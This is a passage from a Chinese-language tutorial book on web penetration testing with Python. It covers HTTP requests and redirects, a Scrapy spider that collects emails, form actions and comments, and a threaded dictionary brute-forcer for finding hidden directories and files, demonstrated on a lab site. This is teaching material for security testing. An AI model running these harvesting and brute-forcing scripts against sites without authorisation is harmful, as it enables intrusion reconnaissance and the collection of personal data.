+   **5XX-服务器端错误**：500 范围用于指示服务器端发生错误。最常见的是`500 Internal Server Error`。

我们建议您在这里学习每个组中的不同代码：

[`developer.mozilla.org/en-US/docs/Web/HTTP/Status`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)

让我们写一些代码。让我们在虚拟机中打开我们的编辑器并创建一个新文件：

1.  首先，通过输入`import requests`来导入`requests`库。

1.  我们将为我们的目标 URL 创建一个变量。我们将再次使用`httpbin.org`并输入：

```py
url='http://httpbin.org/html'
```

1.  然后，我们将使用`req.status _code`打印响应代码。我们通过输入以下内容来执行此操作：

```py
req = requests.get(url) 
```

1.  打印`req.status_code`字符串的响应代码。可以这样做：

```py
print "Response code: " + str(req.status_code) 
```

1.  就是这样！我们将文件保存在`/Example/Section-2`中，命名为`Video-4.py`，然后切换到终端运行脚本。

1.  使用`python Video-4.py`。

您应该在响应中看到`200`状态代码，这意味着我们的请求成功：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00019.jpeg)

干得好，让我们继续。

让我们回到编辑器：

1.  现在，让我们将目标 URL 更改为不存在的内容。为了看到错误代码，我们将更改 URL 并写入`fail`：

```py
import requests
url='http://httpbin.org/fail'
req = requests.get(url)
print "Response code: " + str(req.status_code)
```

1.  让我们保存并再次在终端中运行此脚本。

现在，当我们运行服务器时，它将返回`404`状态代码，这意味着服务器上找不到资源：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00020.jpeg)

所以，现在我们知道我们可以向服务器请求目录和文件列表，并找出哪些存在，哪些不存在。有趣，对吧？

现在，让我们看看如何处理重定向。我们将使用一个示例页面，该页面将获取一个参数 URL 并将我们重定向到该定义的 URL：

1.  让我们回到我们的脚本，并修改它以获取一个名为`payload`的新目录，其中将包含我们要重定向到的 URL。

1.  我们将使用`payload='url'`来重定向到`www.bing.com`。我们可以这样做：

```py
payload={'url':'http://www.bing.com'} 
```

1.  现在，我们将使用这个资源`redirect-to`并添加`params`参数，并将其设置为`payload`。

1.  最后，我们将使用`print req.text`打印内容：

```py
import requests
url='http://httpbin.org/redirect-to'
payload = {'url':'http://www.bing.com'}
req = requests.get(url,params=payload)
print req.text
print "Response code: " + str(req.status_code)
```

1.  我们将保存并再次运行它。

现在，我们得到了什么？一个`200`代码和[`www.bing.com/`](https://www.bing.com/)的内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00021.jpeg)

代码应该是`302`，对吧？我们需要访问请求的历史记录以查看重定向。

1.  让我们添加`print r.history`。历史记录是重定向链中所有响应的列表。我们将使用此循环将每个 URL 的 URL 和响应代码打印到我们的脚本中。

1.  对于`x in req.history`，打印此状态代码与 URL 连接：

```py
import requests
url='http://httpbin.org/redirect-to'
payload = {'url':'http://www.bing.com'}
req = requests.get(url,params=payload)
print req.text
print "Response code: " + str(req.status_code)
for x in req.history:
        print str(x.status_code) + ' : ' + x.url
```

1.  保存并运行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00022.jpeg)

现在，我们可以看到在`200`之前，有一个`302`重定向代码将我们的浏览器发送到[www.bing.com](http://www.bing.com)。

# 总结

在本章中，我们简要介绍了 HTTP，并看到了一个基本的`GET`请求示例。我们还看到了可用的不同 HTTP 方法，可以用来与 Web 应用程序进行交互。

我们还学习了关于 HTTP 请求。我们学习了如何使用 Python 和`requests`库与 Web 应用程序进行交互。我们进一步了解了 HTTP 请求解剖和不同的 HTTP 方法和响应代码。

在第三章中，*使用 Scrapy 进行网络爬虫-映射应用程序*，我们将学习如何编写网络爬虫，使用 Python 编写 Spider，以及如何使用 Scrappy 库。


# 第三章：使用 Scrapy 进行 Web 爬行-映射应用程序

在第二章，*与 Web 应用程序交互*中，我们学习了如何使用 Python 和 requests 库以编程方式与 Web 应用程序进行交互。在本章中，我们将涵盖以下主题：

+   Web 应用程序映射

+   使用 Scrapy 创建我们自己的爬虫

+   使我们的爬虫递归

+   抓取有趣的东西

# Web 应用程序映射

还记得在第一章，*Web 应用程序渗透测试简介*中，我们学习了渗透测试过程。在该过程中，第二阶段是映射。

在映射阶段，我们需要构建应用程序资源和功能的地图或目录。作为安全测试人员，我们的目标是识别应用程序中的所有组件和入口点。我们感兴趣的主要组件是以输入参数为输入的资源、表单和目录。

映射主要是通过爬虫来执行的。爬虫也被称为蜘蛛，通常执行抓取任务，这意味着它们还将从应用程序中提取有趣的数据，如电子邮件、表单、评论、隐藏字段等。

为了执行应用程序映射，我们有以下选项：

+   第一种技术是爬行。其思想是请求第一页，传递所有内容，提取范围内的所有链接，并重复这个过程，直到整个应用程序都被覆盖。然后，我们可以使用 HTTP 代理来识别爬虫可能错过的所有资源和链接。基本上，浏览器中使用 JavaScript 动态生成的大多数 URL 将被爬虫忽略，因为爬虫不解释 JS。

+   另一种技术是通过使用字典攻击来发现应用程序中未链接到任何地方的资源。我们将在下一节中构建我们自己的 BruteForcer。

在这里，我们有 Burp 代理使用代理和蜘蛛功能创建应用程序映射的示例：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00023.jpeg)

我们可以看到目录、静态页面和接受参数的页面，以及不同的参数和不同的值。

所有有趣的部分将用于使用不同的技术处理漏洞，如 SQL 注入，跨站脚本，XML 注入和 LDAP 注入。基本上，映射的目的是覆盖所有应用程序，以识别漏洞识别阶段的有趣资源。

在下一节中，我们将开始开发我们自己的爬虫。准备好了吗！

# 使用 Scrapy 创建我们自己的爬虫

在本节中，我们将创建我们的第一个 Scrapy 项目。我们将定义我们的目标，创建我们的爬虫，最后运行它并查看结果。

# 开始使用 Scrapy

首先，我们需要定义我们想要实现的目标。在这种情况下，我们想要创建一个爬虫，它将从[`www.packtpub.com/`](https://www.packtpub.com/)提取所有的书名。为了做到这一点，我们需要分析我们的目标。如果我们去[`www.packtpub.com/`](https://www.packtpub.com/)网站，右键单击书名并选择检查，我们将看到该元素的源代码。在这种情况下，我们可以看到书名的格式是这样的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00024.jpeg)

创建一个用于提取所有书名的爬虫

在这里，我们可以看到`div`的`class`是`book-block-title`，然后是标题名称。记住这一点，或者在笔记本中记下来，那会更好。我们需要这样做来定义我们在爬行过程中想要提取的内容。现在，让我们开始编码：

1.  让我们回到我们的虚拟机并打开一个终端。为了创建一个爬虫，我们将切换到`/Examples/Section-3`目录：

```py
cd Desktop/Examples/Section-3/
```

1.  然后，我们需要使用以下 Scrapy 命令创建我们的项目：

```py
scrapy startproject basic_crawler 
```

在我们的情况下，爬虫的名称是`basic_crawler`。

1.  当我们创建一个项目时，Scrapy 会自动生成一个具有爬虫基本结构的文件夹。

1.  在`basic_crawler`目录中，您会看到另一个名为`basic_crawler`的文件夹。我们对`items.py`文件和`spiders`文件夹中的内容感兴趣：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00025.jpeg)

这是我们将要处理的两个文件。

1.  因此，我们打开 Atom 编辑器，并通过`Examples | Section-3 | basic crawler`下的`Add Project Folder...`添加我们的项目。

1.  现在，我们需要在 Atom 编辑器中打开`items.py`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00026.jpeg)

在使用 Scrapy 时，我们需要指定在爬取网站时我们感兴趣的内容。这些内容在 Scrapy 中称为 items，并且可以将它们视为我们的数据模块。

1.  因此，让我们编辑`items.py`文件并定义我们的第一个项目。我们可以在前面的截图中看到`BasicCrawlerItem`类已创建。

1.  我们将创建一个名为`title`的变量，它将是`Field`类的对象：

```py
title = scrappy.Field()
```

1.  我们可以删除`title = scrappy.Field()`之后的代码的其余部分，因为它没有被使用。

目前就是这些。

1.  让我们继续进行我们的爬虫。对于爬虫，我们将在为此练习创建的`spiderman.py`文件上进行操作，以节省时间。

1.  我们首先需要将其从`Examples/Section-3/examples/spiders/spiderman-base.py`复制到`/Examples/Section-3/basic_crawler/basic_crawler/spiders/spiderman.py`：

```py
cp examples/spiders/spiderman-base.py basic_crawler/basic_crawler/spiders/spiderman.py
```

1.  然后，打开编辑器中的文件，我们可以在文件顶部看到为其工作所需的导入。我们有`BaseSpider`，这是基本的爬取类。然后，我们有`Selector`，它将帮助我们使用交叉路径提取数据。`BasicCrawlerItem`是我们在`items.py`文件中创建的模型。最后，找到一个`Request`，它将执行对网站的请求：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00027.jpeg)

然后，我们有`class MySpider`，它有以下字段：

+   `name`：这是我们爬虫的名称，以便以后调用它所需的名称。在我们的情况下，它是`basic_crawler`。

+   `allowed_domains`：这是允许被爬取的域名列表。基本上，这是为了将爬虫限制在项目的范围内；在这种情况下，我们使用`packtpub.com`。

+   `start_urls`：这是一个包含爬虫将开始处理的起始 URL 的列表。在这种情况下，它是`https://www.packtpub.com`。

+   `parse`：顾名思义，这里是结果解析的地方。我们用请求的`response`实例化`Selector`，对其进行解析。

然后，我们定义将包含执行以下交叉路径查询结果的`book_titles`变量。交叉路径查询是基于我们在本章开头进行的分析。这将导致一个包含使用响应内容中定义的交叉路径提取的所有书名的数组。现在，我们需要循环该数组，并创建`BasicCrawlerItem`类型的书籍，并将提取的书名分配给书的标题。

这就是我们的基本爬虫。让我们去终端，将目录更改为`basic_crawler`，然后使用`scrapy crawl basic_crawler`运行爬虫。

所有结果都打印在控制台上，我们可以看到书名被正确地抓取出来了：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00028.jpeg)

现在，让我们通过添加`-o books.json -t`，后跟文件类型`json`，将文件夹的输出保存到文件中：

```py
scrapy crawl basic_crawler -o books.json -t json
```

现在运行它。我们将使用`vi books.json`打开`books.json`文件。

我们可以看到书名被提取出来了：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00029.jpeg)

书名中有一些额外的制表符和空格，但我们已经得到了书名。这将是创建爬虫所需的最小结构，但您可能会想我们只是在抓取索引页面。我们如何使其递归地爬取整个网站？这是一个很好的问题，我们将在下一节中回答这个问题。

# 使我们的爬虫递归

在这一部分，我们将开始学习如何提取链接，然后我们将使用它们来使爬虫递归。现在我们已经创建了爬虫的基本结构，让我们添加一些功能：

1.  首先，让我们为这个练习复制准备好的`spiderman.py`文件。从`examples/spiders/spiderman-recursive.py`复制到`basic_crawler/basic_crawler/spiders/spiderman.py`。

1.  然后，回到我们的编辑器。由于我们想要使爬虫递归，为此目的，我们将再次处理`spiderman.py`文件，并开始添加另一个提取器。然而，这次我们将添加链接而不是标题，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00030.jpeg)

1.  此外，我们需要确保链接是有效和完整的，因此我们将创建一个正则表达式，用于验证以下截图中突出显示的链接：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00031.jpeg)

1.  这个正则表达式应该验证所有的 HTTP 和 HTTPS 绝对链接。现在我们有了提取链接的代码，我们需要一个数组来控制已访问的链接，因为我们不想重复链接和浪费资源。

1.  最后，我们需要创建一个循环来遍历找到的链接，如果链接是绝对 URL 并且以前没有被访问过，我们就`yield`一个带有该 URL 的请求来继续这个过程：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00032.jpeg)

如果链接未通过验证，这意味着它是一个相对 URL。因此，我们将通过将相对 URL 与获取该链接的基本 URL 结合来创建一个有效的绝对 URL。然后，我们将使用`yield`请求。

1.  保存它，然后去控制台。

1.  然后，我们将目录更改为`basic_crawler`，用`scrapy crawl basic_crawler -t json -o test.json`运行它，然后按*Enter*。

我们可以看到它现在正在工作。我们正在递归地爬行和抓取网站中的所有页面：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00033.jpeg)

这可能需要很长时间，所以我们按*Ctrl* + *C*取消，然后我们将得到到目前为止的结果文件。

让我们用`vi test.json`命令打开`test.json`文件。

正如我们在下面的截图中看到的，我们有很多书名，来自多个页面：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00034.jpeg)

恭喜！我们已经建立了一个 Web 应用程序爬虫。

想想现在你可以自动化的所有任务。

# 抓取有趣的东西

在这一部分，我们将看看如何提取其他有趣的信息，比如电子邮件、表单和评论，这些对我们的安全分析很有用。

我们已经为我们的爬虫添加了递归功能，所以现在我们准备添加更多功能。在这种情况下，我们将为电子邮件添加一些提取功能，因为拥有一个有效的账户总是很有用的，在我们的测试过程中可能会派上用场。表单将在从浏览器提交信息到应用程序的地方很有用。评论可能提供有趣的信息，开发人员可能在生产中留下了这些信息而没有意识到。

从 Web 应用程序中可以获得更多的东西，但这些通常是最有用的：

1.  首先，让我们将这些字段添加到我们的 item 中。在 Atom 中打开`items.py`文件并添加以下代码：

```py
    link_url = scrapy.Field()
    comment = scrapy.Field()
    location_url = scrapy.Field()
    form = scrapy.Field()
    email = scrapy.Field()
```

这将用于指示信息的来源。

1.  所以，让我们回到`spiderman.py`文件。我们将复制一个准备好的`spicderman.py`文件。我们将`examples/spiders/spiderman-c.py`复制到`basic_crawler/basic_crawler/spiders/spiderman.py`：

```py
cp examples/spiders/spiderman-c.py basic_crawler/basic_crawler/spiders/spiderman.py
```

1.  让我们回到编辑器。

1.  为了提取电子邮件，我们需要将突出显示的代码添加到我们的`spiderman.py`文件中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00035.jpeg)

这个选择器可能会产生一些误报，因为它会提取任何包含`@`符号的单词，以及将选择器检测到的结果存储到我们的 item 中的循环。

就是这样，有了这段代码，我们现在将提取我们在爬行过程中发现的所有电子邮件地址。

现在，我们需要做同样的事情来提取`forms`操作。交叉路径将获取表单的操作属性，该属性指向将处理用户提交的数据的页面。然后，我们遍历发现的内容并将其添加到`items.py`文件中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00036.jpeg)

表单就是这样。

现在，让我们对`comments`代码做同样的操作。我们将创建提取器，并再次迭代结果并将其添加到项目中。现在，我们可以运行爬虫并查看结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00037.jpeg)

现在，让我们回到终端，在`basic_crawler`中，我们将输入`scrapy crawl basic_crawler -o results.json -t json`并按*Enter*。

完成爬行将需要很长时间。过一会儿我们将按*CTRL* + *C*来停止它。

完成后，我们可以用 Atom 编辑器打开`results.json`并检查结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00038.jpeg)

恭喜！您已经扩展了爬虫，以提取有关网站的有趣信息。

您可以查看结果、表单、评论等。我建议您查看其他处理结果的方法，例如传递它们或将它们存储到 SQLite 或 MongoDB 中。

恭喜！您已经使用 Python 创建了您的第一个 Web 爬虫。

# 总结

在本章中，我们看到了什么是 Web 应用程序映射。我们学会了如何创建基本的 Web 应用程序爬虫。在本章中，我们添加了递归功能，并学会了如何使我们的爬虫递归。

最后，我们学会了如何使用 Python 和 Scrapy 库开发 Web 应用程序爬虫。这对于映射 Web 应用程序结构和从页面源代码中收集表单、电子邮件和评论等有趣信息将非常有用。

现在，我们知道如何使用爬虫映射 Web 应用程序，但大多数应用程序都有隐藏的资源。这些资源对所有用户不可访问，或者并非所有用户都链接。幸运的是，我们可以使用暴力攻击技术来发现目录、文件或参数，以找到我们可以在测试中使用的漏洞或有趣信息。

在第四章中，*资源发现*，我们将编写一个工具，在 Web 应用程序的不同部分执行暴力攻击。


# 第四章：资源发现

在第三章中，*使用 Scrapy 进行 Web 爬虫-映射应用程序*，我们看到了如何使用 Python 和 Scrapy 库编写我们自己的爬虫。在本章中，我们将学习：

+   什么是资源发现？

+   构建我们的第一个 BruteForcer

+   分析结果

+   添加更多信息

+   对发现结果进行截图

# 什么是资源发现？

在这一部分，我们将学习什么是资源发现，以及在测试 Web 应用程序时为什么资源发现很重要。此外，我们将介绍 FUZZDB，它将在下一节作为我们的字典数据库使用。

您会记得，在第一章中，*Web 应用程序渗透测试简介*，我们学习了渗透测试过程。过程中的第二阶段是映射。在映射阶段，我们需要构建应用程序页面和功能的地图或目录。在较早的部分中，我们学习了如何使用爬虫执行应用程序映射。我们还了解到爬虫有一些局限性。例如，爬虫无法识别由 JS 生成的链接。这可以通过使用 HTTP 代理或使用 PhantomJS 等无头浏览器来克服。如果我们这样做，我们应该能够识别与 Web 应用程序中的某个地方链接的所有资源，但我的个人经验告诉我，我们可以找到许多未链接的资源。

为了发现这些资源，我们需要通过已知单词的字典执行资源发现。这些工具被称为：

+   字典攻击：在这里，我们使用已知单词的列表来识别资源

+   暴力破解：这是使用暴力破解来识别资源，当使用字符串的排列或组合列表时

+   模糊测试：这不是真正正确的，但经常用来指代资源发现

使用这些技术，我们能找到什么？

+   文件：例如备份文件、测试文件、笔记、脚本、文档和示例

+   目录：例如管理界面、备份、内部区域和上传目录

+   操作：每当选项或参数中有动词名称时，我们可以使用类似单词的字典来识别其他功能

+   Servlets：类似于带有文件的操作

+   参数：我们可以枚举参数中使用的潜在有效字符串的范围或组合

为了在进行资源恢复时取得成功，您需要具有高质量的列表。有许多字典数据库，您可以在其中找到适用于不同环境或场景的各种单词列表。FUZZDB（[`github.com/fuzzdb-project/fuzzdb`](https://github.com/fuzzdb-project/fuzzdb)）是互联网上最受欢迎和最完整的数据库之一。我们将在下一节中使用它。

对于资源发现，我们将专注于可预测的资源位置字典。我建议您在我们的虚拟机中查看它，在本节的代码示例下，熟悉可用的不同字典或字符串列表。

# 构建我们的第一个 BruteForcer

在这一部分，我们将构建一个脚本，帮助我们使用字典发现资源。我们将创建一个基本的 BruteForcer。我们将从定义工具的目标开始，然后查看 BruteForcer 的基本结构的代码。

最后，我们将使用以下步骤针对我们的测试 Web 应用程序运行它：

1.  返回到我们的编辑器，并通过选择文件|添加项目文件夹...|桌面|示例|第 4 节|确定，打开第 4 节的项目文件夹。

1.  然后，打开`forzabruta.py`文件。

1.  在这个脚本中，我们有了我们暴力破解器的基本结构。我们有我们典型的`import`，然后我们有`banner`函数，它将打印脚本的名称。`usage`函数提供了如何使用脚本的帮助。

1.  现在，让我们跳到`start`函数，当我们运行程序时会调用它：

```py
def start(argv):
    banner()
    if len(sys.argv) < 5:
           usage()
           sys.exit()
    try :
        opts, args = getopt.getopt(argv,"w:f:t:")
    except getopt.GetoptError:
               print "Error en arguments"
               sys.exit()

    for opt,arg in opts :
           if opt == '-w' :
                   url=arg
           elif opt == '-f':
                   dict= arg
           elif opt == '-t':
                   threads=arg
    try:
           f = open(dict, "r")
           words = f.readlines()
    except:
           print"Failed opening file: "+ dict+"\n"
           sys.exit()
    launcher_thread(words,threads,url)
```

打印`banner`，然后检查用来调用我们程序的参数。然后，传递参数并分配 URL 字典和线程数。打开字典并读取所有行，最后，使用`words`、`threads`和`url`调用`launcher_thread`。

由于我们希望我们的应用程序能够同时执行多个任务，我们可以使用线程。否则，我们的暴力破解器将是顺序的，对于大字典来说，速度会很慢。通过使用线程，我们可以加快这次攻击的速度。我们可以在其他工具中实现线程时重用这个脚本的框架，因为通常实现线程是棘手的。

1.  `launcher_thread`函数基本上会管理线程，并为字典中的每个单词和目标 URL 实例化请求执行者类，并启动线程。这将对加载在字典中的每个单词执行：

```py
def launcher_thread(names,th,url):
    global i
    i=[]
    resultlist=[]
    i.append(0)
    while len(names):
        try:
            if i[0]<th:
                n = names.pop(0)
                i[0]=i[0]+1
                thread=request_performer(n,url)
                thread.start()

        except KeyboardInterrupt:
            print "ForzaBruta interrupted by user. Finishing attack.."
            sys.exit()
        thread.join()
    return

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print "ForzaBruta interrupted by user, killing all threads..!!"
```

1.  线程实例化了`request_performer`类。这个类有一个`init`方法，用于在创建对象后设置对象，基本上是构造函数。在这种情况下，我们基本上创建了属性`self.word`和`self.urly`，它们将用字典中的单词替换`FUZZ`标记。

然后，我们有`run`方法，它将执行请求并打印请求的 URL 和状态码：

```py
class request_performer(Thread):
    def __init__( self,word,url):
        Thread.__init__(self)
        try:
            self.word = word.split("\n")[0]
            self.urly = url.replace('FUZZ',self.word)
            self.url = self.urly
        except Exception, e:
            print e

    def run(self):
        try:
            r = requests.get(self.url)
            print self.url + " - " + str(r.status_code)
            i[0]=i[0]-1 #Here we remove one thread from the counter
        except Exception, e:
                print e
```

最后，更新线程计数器。当字典中的单词被消耗完时，程序将完成。

上述步骤展示了暴力破解器的基本结构。

让我们看一个使用我们易受攻击的测试应用程序的例子：

1.  转到终端，输入`python forzabruta.py`。

1.  现在我们有了第一个选项，即目标 URL 和单词`FUZZ`，它是将被字典中的每个单词替换的标记。这是我们想要测试的位置，在这种情况下是测试应用程序中的字典和文件的根目录。然后，我们有选项`-t 5`，这是我们想要使用的线程数，最后`-f comment.text`，这是为这个练习创建的字典文件。这很简单，但请记住，在真实测试中，您需要使用 FUZZDB 字典。

1.  运行后，我们应该看到以下截图中显示的结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00039.jpeg)

我们在字典中每个单词有一个结果。我们有一些有效的`200`状态码，还有一个`401`，表示需要身份验证，以及许多`404`未找到的代码。

让我们在浏览器中看一些例子。我们特别感兴趣的是`/Admin`目录。当我们请求`/Admin`时，会弹出一个需要用户名和密码的身份验证表单；我们稍后会回到这个问题：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00040.jpeg)

现在，让我们看看`robots.txt`是否有什么有趣的东西。`robots.txt`中有三个条目：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00041.jpeg)

一个是`/admin`，另一个是`/includes/`目录。我们已经知道了`admin`，但`/backoffice`看起来很有趣。`robot.txt`经常为我们的测试目的提供一些有趣的发现。

哇，恭喜。你写了一个基本的 HTTP 暴力破解器。这个脚本很基础，结果也不是很好，但我们将在接下来的部分中改进它们。

# 分析结果

在本节中，我们将改进我们在上一节中创建的暴力破解器，以便更容易分析结果。我们将看到如何改进结果，然后将改进内容添加到我们的代码中，并最终测试代码而不测试 Web 应用程序。

在上一节中，我们创建了一个基本的 BruteForcer，但是我们发现结果有点基本，并且当我们有很多结果时，很难识别出有趣的发现。因此，我们可以根据状态码添加颜色。一个好的开始是以绿色打印所有状态码大于或等于 200 且小于 300 的结果；以红色打印状态码大于或等于 400 且小于 500 的结果；最后，以蓝色打印状态码大于或等于 300 且小于 400 的结果。这将帮助我们快速识别结果。我们主要感兴趣的是绿色和蓝色的结果。

我们还可以丰富我们的结果，提供有关响应的更多信息，例如字符数、单词数和行数。这将帮助我们区分返回多个资源相同内容的页面，因为我们可以通过查看字符、单词或行来识别它们。

最后，我们将添加根据状态码过滤或隐藏结果的选项。这将有助于删除通常为 404 的任何未找到的响应；尽管通常开发人员会自定义他们的应用程序或服务器返回 200、301 或 302：

1.  让我们回到我们的编辑器，打开文件`forzabruta-2.py`。

1.  添加一些更多的导入，比如`termcolor`，它将允许我们在终端中打印颜色，以及`re`用于正则表达式：

```py
import requests
from threading import Thread
import sys
import time
import getopt
import re
from termcolor import colored
```

1.  在`request_performer`中，我们从响应中获取所有信息，例如：

+   `lines`: 计算新行的数量

+   `chars`: 计算字符的数量

+   `words`: 计算单词的数量

+   `code`: 计算`status_code`：

```py
class request_performer(Thread):
    def __init__(self, word, url,hidecode):
        Thread.__init__(self)
        try:
            self.word = word.split("\n")[0]
            self.urly = url.replace('FUZZ', self.word)
            self.url = self.urly
            self.hidecode = hidecode
        except Exception, e:
            print e

    def run(self):
        try:
            r = requests.get(self.url)
            lines = str(r.content.count("\n"))
            chars = str(len(r._content))
            words = str(len(re.findall("\S+", r.content)))
            code = str(r.status_code)
```

1.  现在，我们将把它们全部添加到结果输出中。这一系列条件将允许我们根据特定隐藏代码的相等代码来过滤非感兴趣的响应，并以三种不同的颜色可视化其他类型的请求：

```py
            if self.hidecode != code:
                if '200' <= code < '300':
                    print colored(code,'green') + " \t\t" + chars + " \t\t" + words + " \t\t " + lines +"\t" + self.url + "\t\t "
                elif '400' <= code < '500':
                    print colored(code,'red') + " \t\t" + chars + " \t\t" + words + " \t\t " + lines +"\t" + self.url + "\t\t "
                elif '300' <= code < '400':
                    print colored(code,'blue') + " \t\t" + chars + " \t\t" + words + " \t\t " + lines +"\t" + self.url + "\t\t "
                else:
                    print colored(code,'yellow') + " \t\t" + chars + " \t\t" + words + " \t\t " + lines +"\t" + self.url + "\t\t "
```

我们将使用`green`表示大于或等于`200`且小于`300`的状态码，使用`red`表示大于或等于`400`且小于`500`的状态码，以及当结果大于或等于`300`且小于`400`时使用`blue`。

1.  现在，我们需要向我们的程序添加一个新参数。我们在`getopt`参数中添加`c`，然后将`-c`的值赋给变量`hidecode`：

```py
def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "w:f:t:c:")
    except getopt.GetoptError:
        print "Error en arguments"
        sys.exit()
    hidecode = 000
    for opt, arg in opts:
        if opt == '-w':
            url = arg
        elif opt == '-f':
            dict = arg
        elif opt == '-t':
            threads = arg
        elif opt == '-c':
 hidecode = arg
    try:
        f = open(dict, "r")
        words = f.readlines()
    except:
        print"Failed opening file: " + dict + "\n"
        sys.exit()
    launcher_thread(words, threads, url,hidecode)
```

1.  我们将`hidecode`传递给`launcher_thread`，然后传递给`request_performer`。在`request_performer`中，在打印之前添加一个条件。为了过滤我们不感兴趣的代码，这通常是 404。

1.  让我们回到终端并运行程序。

1.  将命令更改为`forzabruta-2.py`并运行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00042.jpeg)

你可以看到结果更容易阅读，因为不同的代码可以很快被识别出来。让我们再试一次，添加参数`-c`并在命令行中隐藏响应`404`：

```py
python forzabruta-2.py -w http://scruffybank.com/FUZZ -t 5 -f common.txt -c 404
```

这好多了。

这将帮助我们快速识别有趣的内容所在的位置：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00043.jpeg)

但是`test1.txt`和`test2.txt`看起来是相同的文件，对吧？它们有相同数量的`lines`、`chars`和`words`，就像前面的截图中所突出显示的那样。

通过输入`www.scruffybank.com/test1.txt`在浏览器中打开它们。你只能看到`test1.txt`只有`aaa`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00044.jpeg)

现在，让我们通过输入`www.scruffybank.com/test2.txt`来打开`test2.txt`。内容是`bbb`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00045.jpeg)

它们并不相同，但是使用我们当前的工具，我们无法区分这些文件。让我们看看在下一节中我们如何解决这个问题。

# 添加更多信息

在本节中，我们将继续为我们的 BruteForcer 添加功能，以改进检测并简化过滤。

首先，我们将添加代码来检测是否有重定向，然后我们将添加请求响应事务所花费的时间和响应的 MD5 哈希。最后，我们将测试改进后的脚本。

目前，`requests`库对遵循重定向的资源返回`200`状态码，因为它返回重定向链中最后一个资源的状态码。如果我们想知道是否有重定向，我们需要检查请求的历史记录：

1.  让我们回到 Atom 编辑器，打开文件`forzaBruta-3.py`。我们需要添加这段代码以改进重定向检测。

1.  在第 48 行之后，我们得到了请求的响应。这段代码将检查是否有重定向，并将代码更新为第一个重定向代码：

```py
            if r.history != []:
                first = r.history[0]
                code = str(first.status_code)
```

对于请求时间，我们可以这样做：

1.  记录请求前和请求后的时间，然后从经过的时间中减去开始时间。

为了做到这一点，我们将使用`time`库。我们将在开头添加`import`库，如下面的代码所示：

```py
import requests
from threading import Thread
import sys
import time
import getopt
import re

import md5
from termcolor import colored
```

1.  然后，在请求之前添加以下行以捕获那一刻的时间，请求执行后也是一样：

```py
            start = time.time()
```

1.  然后，我们从经过的时间中减去开始时间，得到响应到达所花费的时间：

```py
            r = requests.get(self.url)
            elaptime = time.time()
            totaltime = str(elaptime - start)
            lines = str(r.content.count("\n"))
            chars = str(len(r._content))
            words = str(len(re.findall("\S+", r.content)))
            code = str(r.status_code)
            hash = md5.new(r.content).hexdigest()
```

# 输入响应内容的哈希

还记得之前的例子中`test1.txt`和`test2.txt`的文件结果相似吗？那是因为`lines`、`chars`和`words`的数量相同。但是有时候你需要知道内容是否实际上有差异，为了做到这一点，我们可以计算内容的 MD5 哈希值，以获取资源的唯一指纹。

我们需要导入 MD5 并添加`forzabruta-3.py`的代码。该哈希将是唯一的，并且对于过滤具有相似`chars`、`words`、`lines`和`code`的资源非常有用。

让我们试试。

让我们回到终端，并使用与之前相同的参数运行`forzabruta-3.py`。现在，情况好多了：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00046.jpeg)

现在结果非常丰富。看看`test1.txt`和`test2.txt`的`MD5`哈希的差异。很酷，对吧？

现在我们有一个值可以用来区分它们。此外，我们可以看到重定向是蓝色的，而不是`200`的结果。如果我们只想寻找`.php`文件怎么办？我们只需要在`FUZZ`字符串后添加`.php`。

同时，我们改为使用`commons`，因为它是这种情况下更大的字典。让我们运行它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00047.jpeg)

你可以看到我们有许多新的结果需要调查。做得好！现在你有一个功能齐全的网络应用程序—BruteForcer。

